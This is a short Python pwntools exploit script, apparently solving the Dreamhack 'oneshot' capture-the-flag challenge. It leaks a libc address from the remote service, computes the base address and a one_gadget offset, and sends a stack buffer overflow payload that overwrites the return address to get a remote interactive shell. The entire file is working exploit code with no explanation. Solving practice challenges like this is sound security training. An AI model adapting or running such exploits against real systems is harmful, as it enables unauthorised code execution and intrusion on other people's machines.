# Name: oneshot.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 19210 # the given port

# conn = process('./oneshot') # local
conn = remote(HOST, PORT)

e = ELF('./oneshot')
libc = ELF('./libc-2.23.so')

one_gadget = 0xf1247

# leak libc base
conn.recvuntil(b'stdout: ')
stdout = int(conn.recvline()[:-1], base=16)
libc_base = stdout - libc.sym['_IO_2_1_stdout_']
one_gadget = libc_base + one_gadget

# exploit
payload = b'A' * 0x18
payload += p64(0)
payload += b'B' * 0x8
payload += p64(one_gadget)

conn.sendafter(b'MSG: ', payload)
conn.interactive()